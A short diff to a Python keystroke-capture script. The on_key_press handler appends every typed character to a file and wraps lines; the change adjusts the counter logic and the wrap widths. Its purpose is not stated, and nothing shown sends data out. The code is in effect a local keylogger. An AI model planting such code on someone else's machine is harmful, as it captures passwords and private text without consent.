@@ -15,20 +15,20 @@ def on_key_press(key):
         if char:
             with open(file_path, "a", encoding="utf-8") as text_file:
                 text_file.write(char)
-                global char_count
                 char_count += 1
 
-                if char_count >= 60:
+                if char_count >= 80:
                     text_file.write("\n")
-                    global char_count
                     char_count = 0
 
     except AttributeError:
         if key in [Key.space, Key.enter, Key.tab]:
             with open(file_path, "a") as text_file:
-                text_file.write("  ")
-                global char_count
-                char_count += 2
+                text_file.write(" ")
+                char_count += 1
+                if char_count >= 60:
+                    text_file.write("\n")
+                    char_count = 0
 
 
 # Ensure the directory structure exists
